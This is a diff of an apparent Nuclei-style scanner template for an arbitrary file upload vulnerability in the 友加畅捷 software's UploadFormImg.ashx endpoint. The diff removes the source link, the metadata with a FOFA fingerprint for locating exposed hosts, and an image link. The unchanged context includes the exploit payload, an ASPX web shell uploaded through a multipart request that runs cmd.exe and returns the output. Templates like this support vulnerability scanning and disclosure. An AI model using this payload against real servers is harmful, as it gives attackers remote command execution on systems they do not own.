@@ -3,12 +3,8 @@ info:
   name: 友加畅捷 UploadFormImg存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/csvq8uk97hlk0lxm'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: csvq8uk97hlk0lxm
-    fofa: icon_hash="2049187099"
 http:
 - raw:
   - 'GET /Report/Upload/UploadFormImg.ashx HTTP/1.1
@@ -66,7 +62,7 @@ http:
 
     <%@ Page Language="C#" %><script runat="server">protected void Page_Load(object sender,EventArgs e){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c netstat -ano";p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.CreateNoWindow=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();}</script>
 
-    ------WebKitFormBoundary7MA4YWxkTrZu0gW--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790606666084-0554758e-809a-4d2e-9e54-e0f3f0e2fdac.png)'
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--'
   redirects: false
   matchers:
   - status:
